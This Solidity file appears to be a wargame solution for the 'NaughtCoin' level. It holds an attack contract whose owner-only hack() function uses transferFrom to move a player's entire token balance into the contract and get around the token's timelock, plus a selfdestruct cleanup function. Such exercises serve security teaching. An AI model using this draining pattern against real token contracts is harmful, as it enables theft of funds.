// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
// import "./interfaces/IERC20.sol";
import "./NaughtCoin.sol";

contract NaughtcoinAttack {
    address public owner;
    IERC20 naughtCoin;


    constructor(address _addr) public {
        owner = msg.sender;
        naughtCoin = NaughtCoin(_addr);
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "!owner");
        _;
    }

    function hack(address _player) external onlyOwner {
        naughtCoin.transferFrom(_player, address(this), naughtCoin.balanceOf(_player));
    }

    function destroy() external onlyOwner {
        selfdestruct(payable(owner));
    }
}